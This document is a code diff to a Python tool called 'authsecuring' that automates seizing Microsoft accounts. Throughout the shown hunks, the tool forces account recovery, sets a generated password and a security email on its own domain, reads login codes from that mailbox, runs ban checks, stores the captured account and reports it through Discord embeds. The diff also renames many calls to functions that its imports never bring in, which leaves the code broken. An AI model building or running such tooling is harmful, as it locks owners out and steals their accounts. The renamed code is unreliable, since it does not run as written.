@@ -3,18 +3,18 @@ from authsecuring.utils.cookies.get_livedata import livedata
 from authsecuring.utils.cookies.safe_cookies import has_cookie
 from authsecuring.utils.security.recovery import recover, verify_password_works, RecoverError
 from authsecuring.utils.security.password_gen import generate_ms_password
-from authsecuring.utils.cookies.get_email_code import get_email_code
+from authsecuring.utils.cookies.get_email_code import fetch_otp
 from authsecuring.utils.login_pwd import login_pwd
-from authsecuring.secure import startSecuringAccount
+from authsecuring.orch import startSecuringAccount
 from authsecuring.auth.send_auth import send_auth
 from authsecuring.auth.handle_redirects import handle_redirects, get_data
 from authsecuring.auth.polish_host import polish_host
 
-from authsecuring.build_embeds import build_account_embeds, build_failure_embed
+from authsecuring.embed_builder import build_account_embeds, build_failure_embed
 from authsecuring.auth.initial_session import get_session
 from authsecuring.auth.account_status import get_account_lock_reason
-from authsecuring.utils.secure import secure
-from authsecuring.account_filters import rejection_reason
+from authsecuring.utils.secure import lock_account
+from authsecuring.filters import rejection_reason
 from authsecuring.utils.proxy import (
     close_session,
     format_exception_reason,
@@ -205,9 +205,9 @@ async def _secure_after_password_login(
             primary_email=secured_ms.get("email") or email,
         )
 
-    from authsecuring.ban_checks import apply_ban_checks
+    from authsecuring.banwatch import apply_ban_checks
 
-    ban_reject = await apply_ban_checks(secured)
+    ban_reject = await run_ban_sweep(secured)
     if ban_reject:
         print(f"[X] - Banned account: {ban_reject}")
         logging.warning("Ban-check rejected %s: %s", email, ban_reject)
@@ -230,7 +230,7 @@ async def _secure_after_password_login(
 
     account_id = uuid.uuid4().hex
     with DBConnection() as db:
-        db.add_secured_account(account_id, secured)
+        db.store_locked(account_id, secured)
 
     return await build_account_embeds(secured, elapsed, account_id)
 
@@ -320,14 +320,14 @@ def _flowtoken_from_auth(info: dict) -> tuple[str | None, str | None]:
     return proofs[0]["data"], None
 
 
-async def recovery_secure(
+async def romeo_recover(
     email: str,
     method: str,
     data: dict,
     on_credentials: CredentialsNotify | None = None,
 ) -> dict:
 
-    session = get_session()
+    session = open_session()
 
     account = {
         "microsoft": {
@@ -377,7 +377,7 @@ async def recovery_secure(
 
             sname = uuid.uuid4().hex[:16]
             # Letters+digits, mixed case — no symbols
-            password = generate_ms_password(14)
+            password = make_ms_password(14)
             security_email = f"{sname}@{config['domain']}"
             print(f"[+] - Generated Security Email ({security_email})")
 
@@ -414,7 +414,7 @@ async def recovery_secure(
                         credentials_changed=exc.credentials_changed,
                     )
                 except Exception as exc:
-                    if is_proxy_transport_error(exc):
+                    if is_network_glitch(exc):
                         return _failure_result(
                             email,
                             f"Network error during recovery ({exc.__class__.__name__}). Retry the account.",
@@ -452,20 +452,20 @@ async def recovery_secure(
 
                 # Drop the recovery jar — account.live.com + login.live.com leave
                 # duplicate MSCC cookies that crash httpx. Fresh session for OTP login.
-                await close_session(session)
-                session = get_session()
+                await close_http(session)
+                session = open_session()
 
                 # Soft verify only — never abort recovery on flaky check.
                 try:
                     pwd_status = await verify_password_works(session, email, password)
                 except Exception as exc:
-                    if is_proxy_transport_error(exc):
+                    if is_network_glitch(exc):
                         logging.warning(
                             "Password verify proxy error for %s — rotating SSID and retrying once",
                             email,
                         )
-                        await close_session(session)
-                        session = get_session()
+                        await close_http(session)
+                        session = open_session()
                         try:
                             pwd_status = await verify_password_works(session, email, password)
                         except Exception:
@@ -571,7 +571,7 @@ async def recovery_secure(
                 account = None
                 from authsecuring.utils.security.force_password import strip_unverified
 
-                login_password = strip_unverified(password)
+                login_password = clean_password(password)
 
                 async def _otp_login(s):
                     import time as _time
@@ -605,7 +605,7 @@ async def recovery_secure(
                             f"[~] - Getting email code (OTP round {round_i}/"
                             f"{max_otp_rounds}, {otp_timeout_s}s)..."
                         )
-                        code = await get_email_code(
+                        code = await fetch_otp(
                             security_email, timeout=otp_timeout_s, since=since
                         )
                         print(f"Got code - {code}")
@@ -635,7 +635,7 @@ async def recovery_secure(
                     live = await livedata(s)
                     ppft = live["ppft"]
 
-                    return await startSecuringAccount(
+                    return await romeo_secure(
                         session=s,
                         email=email,
                         device=flowtoken,
@@ -647,8 +647,8 @@ async def recovery_secure(
                     )
 
                 print("[~] - Logging in via security-email OTP (password is fallback)...")
-                await close_session(session)
-                session = get_session()
+                await close_http(session)
+                session = open_session()
 
                 try:
                     account, session = await run_with_proxy_retry(
@@ -661,7 +661,7 @@ async def recovery_secure(
                         email=email,
                     )
                 except Exception as exc:
-                    if is_proxy_transport_error(exc):
+                    if is_network_glitch(exc):
                         logging.warning(
                             "otp path proxy exhausted for %s — falling back to password",
                             email,
@@ -676,8 +676,8 @@ async def recovery_secure(
                             credentials_changed=True,
                             fallback_password=True,
                         )
-                        await close_session(session)
-                        session = get_session()
+                        await close_http(session)
+                        session = open_session()
                     else:
                         raise
 
@@ -710,7 +710,7 @@ async def recovery_secure(
                                 email=email,
                                 security_email=security_email,
                                 recovery_code=new_recovery_code,
-                                preferred_password=strip_unverified(password),
+                                preferred_password=clean_password(password),
                                 max_attempts=3,
                             )
                             if forced_rc:
@@ -722,8 +722,8 @@ async def recovery_secure(
                                     "[+] - Forced password stuck after OTP failure — "
                                     "retrying password login"
                                 )
-                                await close_session(session)
-                                session = get_session()
+                                await close_http(session)
+                                session = open_session()
 
                                 async def _pwd_login_after_force(s):
                                     return await _secure_after_password_login(
@@ -758,7 +758,7 @@ async def recovery_secure(
                                         force_login_exc,
                                     )
                             else:
-                                password = f"{strip_unverified(password)} (UNVERIFIED — may not work)"
+                                password = f"{clean_password(password)} (UNVERIFIED — may not work)"
                         except Exception as force_exc:
                             logging.exception(
                                 "force_password_after_recover failed for %s", email
@@ -790,8 +790,8 @@ async def recovery_secure(
                         "[!] - Security-email OTP failed after resend; "
                         f"falling back to password login (verify={pwd_status})..."
                     )
-                    await close_session(session)
-                    session = get_session()
+                    await close_http(session)
+                    session = open_session()
 
                     async def _pwd_login(s):
                         return await _secure_after_password_login(
@@ -813,7 +813,7 @@ async def recovery_secure(
                             email=email,
                         )
                     except Exception as exc:
-                        if is_proxy_transport_error(exc):
+                        if is_network_glitch(exc):
                             return _failure_result(
                                 email,
                                 f"Network error during password login "
@@ -873,7 +873,7 @@ async def recovery_secure(
                 if new_recovery_code:
                     # Surface a readable reason — never dump bare AttributeError.group
                     # (httpx ReadTimeout often has empty str(exc) → blank Discord text)
-                    reason = format_exception_reason(exc)
+                    reason = proxy_error_reason(exc)
                     where = ""
                     try:
                         import traceback as _tb
@@ -883,7 +883,7 @@ async def recovery_secure(
                             where = f" ({fr.filename.rsplit('/', 1)[-1]}:{fr.lineno})"
                     except Exception:
                         pass
-                    if is_proxy_transport_error(exc):
+                    if is_network_glitch(exc):
                         reason = (
                             f"Network/proxy error ({reason}). "
                             "Credentials above are valid — retry securing."
@@ -906,7 +906,7 @@ async def recovery_secure(
                     )
                 raise
             finally:
-                await close_session(session)
+                await close_http(session)
             
         case "authpwd":
             # Password + authenticator TOTP login, then secure(recovery=True)
@@ -1013,8 +1013,8 @@ async def recovery_secure(
                                 f"[!] - authpwd secure() retry {secure_try}/{secure_attempts}"
                                 " — fresh sticky + re-login…"
                             )
-                            await close_session(session)
-                            session = get_session()
+                            await close_http(session)
+                            session = open_session()
                             login_ok, session = await run_with_proxy_retry(
                                 session,
                                 _totp_login,
@@ -1037,7 +1037,7 @@ async def recovery_secure(
                     except Exception as exc:
                         last_secure_exc = exc
                         if (
-                            is_proxy_transport_error(exc)
+                            is_network_glitch(exc)
                             and secure_try < secure_attempts
                         ):
                             logging.warning(
@@ -1075,8 +1075,8 @@ async def recovery_secure(
                         )
                         or replaced
                     )
-                    reason = format_exception_reason(exc)
-                    if is_proxy_transport_error(exc):
+                    reason = proxy_error_reason(exc)
+                    if is_network_glitch(exc):
                         reason = (
                             f"Network/proxy error ({reason}). "
                             "Retry securing — credentials may already have changed."
@@ -1142,9 +1142,9 @@ async def recovery_secure(
                         primary_email=ms.get("email") or email,
                     )
 
-                from authsecuring.ban_checks import apply_ban_checks
+                from authsecuring.banwatch import apply_ban_checks
 
-                ban_reject = await apply_ban_checks(dsecured)
+                ban_reject = await run_ban_sweep(dsecured)
                 if ban_reject:
                     print(f"[X] - Banned account: {ban_reject}")
                     logging.warning("Ban-check rejected authpwd %s: %s", email, ban_reject)
@@ -1178,11 +1178,11 @@ async def recovery_secure(
                 final_time = time() - initialTime
                 account_id = uuid.uuid4().hex
                 with DBConnection() as database:
-                    database.add_secured_account(account_id, dsecured)
+                    database.store_locked(account_id, dsecured)
                 return await build_account_embeds(dsecured, final_time, account_id)
             except Exception as exc:
                 logging.exception("recovery_secure authpwd failed for %s", email)
-                if is_proxy_transport_error(exc):
+                if is_network_glitch(exc):
                     return _failure_result(
                         email,
                         f"Network error during authenticator secure ({exc.__class__.__name__}). Retry.",
@@ -1191,7 +1191,7 @@ async def recovery_secure(
                     )
                 raise
             finally:
-                await close_session(session)
+                await close_http(session)
 
     logging.error("recovery_secure unknown method=%s email=%s", method, email)
     return _failure_result(email, f"Unknown secure method: {method}")
